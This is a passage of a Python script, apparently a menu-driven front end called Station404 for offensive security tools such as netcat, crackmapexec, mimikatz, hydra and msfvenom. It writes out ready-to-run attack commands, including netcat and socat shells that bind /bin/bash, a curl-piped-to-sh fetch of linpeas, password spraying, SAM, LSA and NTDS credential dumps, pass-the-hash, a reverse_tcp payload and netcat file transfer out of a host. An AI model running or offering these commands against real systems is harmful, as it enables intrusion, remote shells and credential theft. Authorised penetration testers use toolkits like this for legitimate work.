        run_cmd(f"nc -zv {t} {pr}")
    elif c == '4':
        t = get_target("Target: ")
        p = get_target("Port: ")
        run_cmd(f"nc {t} {p}")
    elif c == '5':
        p = get_target("Port: ")
        o = get_target("Output file: ")
        run_cmd(f"nc -lvnp {p} > {o}")
    elif c == '6':
        t = get_target("Target: ")
        p = get_target("Port: ")
        f = get_target("File to send: ")
        run_cmd(f"nc {t} {p} < {f}")
    elif c == '7':
        p = get_target("Port: ")
        run_cmd(f"while true; do nc -lvnp {p}; done")
    elif c == '8':
        p = get_target("Port: ")
        run_cmd(f"nc -lvnup {p}")
    elif c == '9':
        p = get_target("Port: ")
        cmd = get_target("Command to execute: ")
        run_cmd(f"nc -lvnp {p} -e {cmd}")
    elif c == '10':
        lp = get_target("Local port: ")
        t = get_target("Target host: ")
        tp = get_target("Target port: ")
        run_cmd(f"nc -lvnp {lp} | nc {t} {tp}")

def tool_linpeas():
    clear()
    print(f"{R}╔══════════════════════════════════════╗{RESET}")
    print(f"{R}║{W}           41. LINPEAS                {R}║{RESET}")
    print(f"{R}╚══════════════════════════════════════╝{RESET}\n")
    print(f"{Y}  [1]{W}  Run linpeas (if already on target)")
    print(f"{Y}  [2]{W}  Download and run via curl")
    print(f"{Y}  [3]{W}  Run with all checks")
    print(f"{Y}  [4]{W}  Network info only")
    print(f"{Y}  [5]{W}  Save output to file")
    print(f"{Y}  [6]{W}  Serve linpeas via HTTP")
    print(f"{Y}  [0]{W}  Back\n")
    c = input(f"{R}  >> {W}").strip()
    if c == '0': return
    if c == '1': run_cmd("./linpeas.sh")
    elif c == '2': run_cmd("curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh")
    elif c == '3': run_cmd("./linpeas.sh -a")
    elif c == '4': run_cmd("./linpeas.sh -n")
    elif c == '5':
        o = get_target("Output file: ")
        run_cmd(f"./linpeas.sh | tee {o}")
    elif c == '6':
        p = get_target("Port to serve on: ")
        run_cmd(f"python3 -m http.server {p}")



def tool_crackmapexec():
    clear()
    print(f"{R}╔══════════════════════════════════════╗{RESET}")
    print(f"{R}║{W}        45. CRACKMAPEXEC              {R}║{RESET}")
    print(f"{R}╚══════════════════════════════════════╝{RESET}\n")
    print(f"{Y}  [1]{W}  SMB scan network")
    print(f"{Y}  [2]{W}  SMB password spray")
    print(f"{Y}  [3]{W}  SMB command execution")
    print(f"{Y}  [4]{W}  List shares")
    print(f"{Y}  [5]{W}  Dump SAM")
    print(f"{Y}  [6]{W}  Dump LSA")
    print(f"{Y}  [7]{W}  Pass the hash")
    print(f"{Y}  [8]{W}  WinRM access")
    print(f"{Y}  [9]{W}  MSSQL scan")
    print(f"{Y}  [10]{W} Enumerate users")
    print(f"{Y}  [11]{W} Enumerate groups")
    print(f"{Y}  [12]{W} Spider shares")
    print(f"{Y}  [0]{W}  Back\n")
    c = input(f"{R}  >> {W}").strip()
    if c == '0': return
    t = get_target("Target IP/range: ")
    if c == '1': run_cmd(f"crackmapexec smb {t}")
    elif c == '2':
        u = get_target("Username list: ")
        p = get_target("Password: ")
        run_cmd(f"crackmapexec smb {t} -u {u} -p {p}")
    elif c == '3':
        u = get_target("Username: ")
        p = get_target("Password: ")
        cmd = get_target("Command: ")
        run_cmd(f"crackmapexec smb {t} -u {u} -p {p} -x '{cmd}'")
    elif c == '4':
        u = get_target("Username: ")
        p = get_target("Password: ")
        run_cmd(f"crackmapexec smb {t} -u {u} -p {p} --shares")
    elif c == '5':
        u = get_target("Username: ")
        p = get_target("Password: ")
        run_cmd(f"crackmapexec smb {t} -u {u} -p {p} --sam")
    elif c == '6':
        u = get_target("Username: ")
        p = get_target("Password: ")
        run_cmd(f"crackmapexec smb {t} -u {u} -p {p} --lsa")
    elif c == '7':
        u = get_target("Username: ")
        h = get_target("Hash (NTLM): ")
        run_cmd(f"crackmapexec smb {t} -u {u} -H {h}")
    elif c == '8':
        u = get_target("Username: ")
        p = get_target("Password: ")
        run_cmd(f"crackmapexec winrm {t} -u {u} -p {p}")
    elif c == '9': run_cmd(f"crackmapexec mssql {t}")
    elif c == '10':
        u = get_target("Username: ")
        p = get_target("Password: ")
        run_cmd(f"crackmapexec smb {t} -u {u} -p {p} --users")
    elif c == '11':
        u = get_target("Username: ")
        p = get_target("Password: ")
        run_cmd(f"crackmapexec smb {t} -u {u} -p {p} --groups")
    elif c == '12':
        u = get_target("Username: ")
        p = get_target("Password: ")
        run_cmd(f"crackmapexec smb {t} -u {u} -p {p} --spider C$")

def tool_generic(num, name):
    clear()
    print(f"{R}╔══════════════════════════════════════╗{RESET}")
    print(f"{R}║{W}      {num}. {name.upper():<30}{R}║{RESET}")
    print(f"{R}╚══════════════════════════════════════╝{RESET}\n")
    print(f"{Y}  [1]{W} Run with target")
    print(f"{Y}  [2]{W} Custom command")
    print(f"{Y}  [0]{W} Back\n")
    c = input(f"{R}  >> {W}").strip()
    if c == '0': return
    t = get_target()
    if c == '1': run_cmd(f"{name} {t}")
    elif c == '2':
        cmd = get_target("Custom command: ")
        run_cmd(cmd)

# ══════════════════════════════════════════════════════
# TOOL DISPATCHER
# ══════════════════════════════════════════════════════

def dispatch(num):
    if num == '01': run_tool_with_extra(tool_whois, '01')
    elif num == '02': run_tool_with_extra(tool_theharvester, '02')
    elif num == '04': run_tool_with_extra(tool_sublist3r, '04')
    elif num == '05': run_tool_with_extra(tool_dnsenum, '05')
    elif num == '06': run_tool_with_extra(tool_recon_ng, '06') #2
    elif num == '07': run_tool_with_extra(tool_dirsearch, '07') #3
    elif num == '08': run_tool_with_extra(tool_feroxbuster, '08')#4
    elif num == '09': run_tool_with_extra(tool_arjun, '09')#5
    elif num == '10': run_tool_with_extra(tool_nmap, '10')
    elif num == '11': run_tool_with_extra(tool_masscan, '11')
    elif num == '12': run_tool_with_extra(tool_rustscan, '12')#6
    elif num == '13': run_tool_with_extra(tool_nikto, '13')
    elif num == '14': run_tool_with_extra(tool_gobuster, '14')
    elif num == '15': run_tool_with_extra(tool_ffuf, '15')
    elif num == '16': run_tool_with_extra(tool_whatweb, '16')#7
    elif num == '17': run_tool_with_extra(tool_wpscan, '17')#8
    elif num == '18': run_tool_with_extra(tool_netdiscover, '18')#9
    elif num == '19': run_tool_with_extra(tool_enum4linux, '19')#10
    elif num == '20': run_tool_with_extra(tool_nuclei, '20')#11
    elif num == '21': run_tool_with_extra(tool_sqlmap, '21')
    elif num == '22': run_tool_with_extra(tool_xsstrike, '22')#12
    elif num == '23': run_tool_with_extra(tool_wapITI, '23')#13
    elif num == '24': run_tool_with_extra(tool_openvas, '24')#14
    elif num == '25': run_tool_with_extra(tool_searchsploit, '25')#15
    elif num == '26': run_tool_with_extra(tool_wfuzz, '26')#16
    elif num == '27': run_tool_with_extra(tool_metasploit, '27')
    elif num == '28': run_tool_with_extra(tool_msfvenom, '28')
    elif num == '29': run_tool_with_extra(tool_searchsploit, '29')#17
    elif num == '30': run_tool_with_extra(tool_commix, '30')#18
    elif num == '31': run_tool_with_extra(tool_sqlninja, '31')#19
    elif num == '32': run_tool_with_extra(tool_beef_xss, '32')#20
    elif num == '33': run_tool_with_extra(tool_hydra, '33')
    elif num == '34': run_tool_with_extra(tool_medusa, '34')#21
    elif num == '35': run_tool_with_extra(tool_crowbar, '35')#22
    elif num == '36': run_tool_with_extra(tool_responder, '36')#23
    elif num == '37': run_tool_with_extra(tool_netcat, '37')
    elif num == '38': run_tool_with_extra(tool_socat, '38')#24
    elif num == '39': run_tool_with_extra(tool_pwncat, '39')#25
    elif num == '40': run_tool_with_extra(tool_mimikatz, '40')#26
    elif num == '41': run_tool_with_extra(tool_linpeas, '41')
    elif num == '42': run_tool_with_extra(tool_winpeas, '42')#27
    elif num == '43': run_tool_with_extra(tool_pspy, '43')#28
    elif num == '44': run_tool_with_extra(tool_bloodhound, '44')#29
    elif num == '45': run_tool_with_extra(tool_crackmapexec, '45')
    elif num == '46': run_tool_with_extra(tool_impacket_secretsdump, '46')#30
    elif num == '47': run_tool_with_extra(tool_ligolo_ng, '47')#31
    elif num == '48': run_tool_with_extra(tool_chisel, '48')#32
    elif num == '49': run_tool_with_extra(tool_proxychains, '49')#33
    elif num == '50': run_tool_with_extra(tool_responder, '50')#34
    elif num == '51': run_tool_with_extra(tool_tor, '51')#35

# ══════════════════════════════════════════════════════
# MENUS
# ══════════════════════════════════════════════════════

def menu1():
    print(f"""
{R} ┌─ NEXT
{R} ├─ EXIT        ┌─────────────────┐                        ┌─────────┐                         ┌────────────────────────┐
{R} └─┬────────────┤     RECON       ├─────────┬──────────────┤ SCANNING├────────────┬────────────┤ Vulnerability Analysis ├────
{R}   │            └─────────────────┘         │              └─────────┘            │            └────────────────────────┘
{R}   ├─ {Y}01.{W}{TOOLS['01']:<15}                    {R}├─ {Y}10.{W}{TOOLS['10']:<15}                 {R}├─ {Y}20.{W}{TOOLS['20']}
{R}   ├─ {Y}02.{W}{TOOLS['02']:<15}                    {R}├─ {Y}11.{W}{TOOLS['11']:<15}                 {R}├─ {Y}21.{W}{TOOLS['21']}
{R}   ├─ {Y}04.{W}{TOOLS['04']:<15}                    {R}├─ {Y}12.{W}{TOOLS['12']:<15}                 {R}├─ {Y}22.{W}{TOOLS['22']}
{R}   ├─ {Y}05.{W}{TOOLS['05']:<15}                    {R}├─ {Y}13.{W}{TOOLS['13']:<15}                 {R}├─ {Y}23.{W}{TOOLS['23']}
{R}   ├─ {Y}06.{W}{TOOLS['06']:<15}                    {R}├─ {Y}14.{W}{TOOLS['14']:<15}                 {R}├─ {Y}24.{W}{TOOLS['24']}
{R}   ├─ {Y}07.{W}{TOOLS['07']:<15}                    {R}├─ {Y}15.{W}{TOOLS['15']:<15}                 {R}├─ {Y}25.{W}{TOOLS['25']}
{R}   ├─ {Y}08.{W}{TOOLS['08']:<15}                    {R}├─ {Y}16.{W}{TOOLS['16']:<15}                 {R}└─ {Y}26.{W}{TOOLS['26']}
{R}   └─ {Y}09.{W}{TOOLS['09']:<15}                    {R}├─ {Y}17.{W}{TOOLS['17']}
{R}                                            {R}├─ {Y}18.{W}{TOOLS['18']}
{R}                                            ├─ {Y}19.{W}{TOOLS['19']}
{RESET}""")

def menu2():
    print(f"""
{R} ┌─ NEXT
{R} ├─ BACK                                                  ┌─────────┐
{R}─┴─┬─────────────────────────────────────┬────────────────┤ EXPLOIT ├─────────────┬────────────────────────
{R}   │                                     │                └─────────┘             │
{R}   ├─ {Y}27.{W}{TOOLS['27']:<15}                 {R}├─ {Y}37.{W}{TOOLS['37']:<15}                    {R}├─ {Y}47.{W}{TOOLS['47']}
{R}   ├─ {Y}28.{W}{TOOLS['28']:<15}                 {R}├─ {Y}38.{W}{TOOLS['38']:<15}                    {R}├─ {Y}48.{W}{TOOLS['48']}
{R}   ├─ {Y}29.{W}{TOOLS['29']:<15}                 {R}├─ {Y}39.{W}{TOOLS['39']:<15}                    {R}├─ {Y}49.{W}{TOOLS['49']}
{R}   ├─ {Y}30.{W}{TOOLS['30']:<15}                 {R}├─ {Y}40.{W}{TOOLS['40']:<15}                    {R}├─ {Y}50.{W}{TOOLS['50']}
{R}   ├─ {Y}31.{W}{TOOLS['31']:<15}                 {R}├─ {Y}41.{W}{TOOLS['41']:<15}                    {R}└─ {Y}51.{W}{TOOLS['51']}
{R}   ├─ {Y}32.{W}{TOOLS['32']:<15}                 {R}├─ {Y}42.{W}{TOOLS['42']}
{R}   ├─ {Y}33.{W}{TOOLS['33']:<15}                 {R}├─ {Y}43.{W}{TOOLS['43']}
{R}   ├─ {Y}34.{W}{TOOLS['34']:<15}                 {R}├─ {Y}44.{W}{TOOLS['44']}
{R}   ├─ {Y}35.{W}{TOOLS['35']:<15}                 {R}├─ {Y}45.{W}{TOOLS['45']}
{R}   └─ {Y}36.{W}{TOOLS['36']:<15}                 {R}└─ {Y}46.{W}{TOOLS['46']}
{RESET}""")

# ══════════════════════════════════════════════════════
# MAIN
# ══════════════════════════════════════════════════════

# Recommended command templates for common tools (expanded)
RECOMMENDED_CMDS = {
    'whois': [
        'whois {target}',
        'whois -H {target}'
    ],
    'theharvester': [
        'theharvester -d {target} -b all -l 500',
        'theharvester -d {target} -b google -l 1000'
    ],
    'sublist3r': [
        'sublist3r -d {target} -o subdomains.txt',
        'sublist3r -d {target} -t 50'
    ],
    'dnsenum': [
        'dnsenum --enum {target}',
        'dnsenum --dnsserver 8.8.8.8 {target}'
    ],
    'recon-ng': [
        'recon-ng -m recon/domains-hosts/brute_hosts -o target={target}',
        'recon-ng -w workspace -x "modules search"'
    ],
    'dirsearch': [
        'python3 dirsearch/dirsearch.py -u {target} -e * -x 400,401 -t 50',
        'python3 dirsearch/dirsearch.py -u {target} -w /usr/share/wordlists/dirb/common.txt'
    ],
    'feroxbuster': [
        'feroxbuster -u {target} -w /usr/share/wordlists/dirb/common.txt -x php,html -t 50',
        'feroxbuster -u {target} -w common.txt -t 100 -s 200,204'
    ],
    'arjun': [
        'arjun -u {target} -o arjun_results.txt',
        'arjun -u {target} --smart'
    ],
    'nmap': [
        'nmap -sS -A {target}',
        'nmap -p- --min-rate 1000 {target}',
        'nmap -sV --script vuln {target}'
    ],
    'masscan': [
        'masscan {target} -p1-65535 --rate=1000 -oG masscan.gnmap'
    ],
    'rustscan': [
        'rustscan -a {target} -- -A -sV'
    ],
    'nikto': [
        'nikto -h {target} -o nikto_{target}.txt',
        'nikto -h {target} -Tuning +x 9'
    ],
    'gobuster': [
        'gobuster dir -u {target} -w /usr/share/wordlists/dirb/common.txt -t 50',
        'gobuster dir -u {target} -w /usr/share/wordlists/raft-medium-directories.txt -t 100'
    ],
    'ffuf': [
        'ffuf -u {target}/FUZZ -w /usr/share/wordlists/dirb/common.txt -t 50',
        'ffuf -u {target}/FUZZ -w /usr/share/wordlists/vuln/raft-large-files.txt -mc 200'
    ],
    'whatweb': [
        'whatweb -v {target}',
        'whatweb --log-verbose whatweb.txt {target}'
    ],
    'wpscan': [
        'wpscan --url {target} --enumerate u',
        'wpscan --url {target} --enumerate vp --plugins-detection mixed'
    ],
    'netdiscover': [
        'netdiscover -r {target}/24',
        'netdiscover -i eth0 -r {target}/24'
    ],
    'enum4linux': [
        'enum4linux -a {target}',
        'enum4linux -u username -p password {target}'
    ],
    'nuclei': [
        'nuclei -u {target} -t /path/to/templates -severity high',
        'nuclei -l targets.txt -t cves/ -o nuclei_out.txt'
    ],
    'sqlmap': [
        'sqlmap -u "{target}" --batch --level=3 --risk=2',
        'sqlmap -u "{target}?id=1" --dbs'
    ],
    'xsstrike': [
        'xsstrike -u {target} -a',
        'xsstrike -u {target} --crawl'
    ],
    'wapiti': [
        'wapiti -u {target} -f txt -o wapiti_report.txt',
        'wapiti -u {target} -s low'
    ],
    'openvas': [
        'openvas-setup && openvas-start',
        'omp -u admin -w password -h {target} -T 1'
    ],
    'searchsploit': [
        'searchsploit {target}',
        'searchsploit --nmap {target}.nmap'
    ],
    'wfuzz': [
        'wfuzz -c -w /usr/share/wordlists/dirb/common.txt --hc 404 {target}/FUZZ',
        'wfuzz -c -w payloads.txt -d "param=valueFUZZ" {target}'
    ],
    'metasploit': [
        'msfconsole -q',
        'msfconsole -x "search type:exploit name:php"'
    ],
    'msfvenom': [
        'msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={lhost} LPORT=4444 -f elf -o shell.elf'
    ],
    'commix': [
        'commix -u {target} --batch',
        'commix -u {target} --os-shell'
    ],
    'sqlninja': [
        'sqlninja -u {target} -f sqlninja.conf'
    ],
    'beef': [
        'beef-xss',
        'beef-xss --help'
    ],
    'hydra': [
        'hydra -l admin -P /usr/share/wordlists/rockyou.txt {target} ssh',
        'hydra -L users.txt -P pass.txt {target} ftp'
    ],
    'medusa': [
        'medusa -h {target} -U users.txt -P pass.txt -M ssh',
    ],
    'crowbar': [
        'crowbar -b ssh -s {target} -u user -c /path/to/pass.lst'
    ],
    'responder': [
        'responder -I eth0 -wrf',
    ],
    'netcat': [
        'nc -v -n {target} 80',
        'nc -lvp 4444 -e /bin/bash'
    ],
    'socat': [
        'socat TCP-LISTEN:4444,fork EXEC:/bin/bash',
    ],
    'pwncat': [
        'pwncat -l 4444',
    ],
    'mimikatz': [
        'mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit'
    ],
    'linpeas': [
        'linpeas.sh > linpeas.txt'
    ],
    'winpeas': [
        'winpeas.bat > winpeas.txt'
    ],
    'pspy': [
        'pspy64 -p',
    ],
    'bloodhound': [
        'bloodhound --collectionmethod all --domain example.local',
    ],
    'crackmapexec': [
        'crackmapexec smb {target} -u user -p pass --shares',
        'cme smb {target} --ntds'
    ],
    'impacket': [
        'secretsdump.py -just-dc-ntlm DOMAIN/username@{target}',
    ],
    'ligolo': [
        'ligolo-server -p 8080',
    ],
    'chisel': [
        'chisel client {server}:8000 R:1080:127.0.0.1:1080',
    ],
    'proxychains': [
        'proxychains4 nmap -sT {target}',
    ],
    'anonsurf': [
        'anonsurf start',
        'anonsurf stop'
    ],
    'tor': [
        'service tor start',
    ],
}

def run_tool_with_extra(tool_func, code):
    """Run the tool-specific menu/function, then present extra generic options."""
    # call original tool function (shows its own interactive menu)
    try:
        tool_func()
    except Exception as e:
        print(f"{R}  [!] Error running tool menu: {e}{RESET}")
        time.sleep(1)

    # After returning, present extra options
    tool_name = TOOLS.get(code, '')
    while True:
        clear()
        print(f"{R} Extra options for {W}{tool_name}{RESET}\n")
        print(f"{Y}  [1]{W} Run a custom command for this tool")
        if tool_name in RECOMMENDED_CMDS:
            print(f"{Y}  [2]{W} Show recommended commands")
        print(f"{Y}  [0]{W} Back to main menu")
        choice = input(f"{R}  >> {W}").strip()
        if choice == '0':
            break
        elif choice == '1':
            cmd = input(f"{Y}  Enter full command (use {{target}} placeholder if needed): {W}").strip()
            if '{target}' in cmd:
                target = get_target()
                cmd = cmd.format(target=target)
            run_cmd(cmd)
        elif choice == '2' and tool_name in RECOMMENDED_CMDS:
            clear()
            print(f"{R} Recommended commands for {tool_name}:{RESET}\n")
            for i, tpl in enumerate(RECOMMENDED_CMDS[tool_name], start=1):
                print(f"  {i}. {tpl}")
            sel = input(f"{R}  Enter number to run or 0 to go back: {W}").strip()
            if sel == '0':
                continue
            try:
                sel_i = int(sel) - 1
                tpl = RECOMMENDED_CMDS[tool_name][sel_i]
                if '{target}' in tpl:
                    target = get_target()
                    tpl = tpl.format(target=target)
                run_cmd(tpl)
            except Exception:
                print(f"{R}  Invalid selection{RESET}")
                time.sleep(1)
        else:
            print(f"{R}  [!] Invalid option{RESET}")
            time.sleep(1)


def main():
    # Check tool installation before running menu
    check_tools_installation()
    
    state = 1
    while True:
        try:
            clear()
            banner()

            if state == 1:
                menu1()
            elif state == 2:
                menu2()

            c = input(f"{R}>>#  {W}").strip()

            if c.lower() in ['n', 'next']:
                state = 2
            elif c.lower() in ['b', 'back']:
                state = 1
            elif c.lower() in ['x', 'exit', 'quit']:
                clear()
                slowprint("  Exiting Station404...")
                slowprint("  good bye, take safe and see u again..........")
                sys.exit()
            elif c.zfill(2) in TOOLS:
                dispatch(c.zfill(2))
            else:
                print(f"{R}  [!] Invalid option!{RESET}")
                time.sleep(1)

        except KeyboardInterrupt:
            print(f"\n{R}  [!] Use 'x' to exit properly!{RESET}")
            time.sleep(1)
        except SystemExit:
            raise
        except Exception as e:
            print(f"{R}  [!] Error: {e}{RESET}")
            time.sleep(1)

if __name__ == "__main__":
    main()
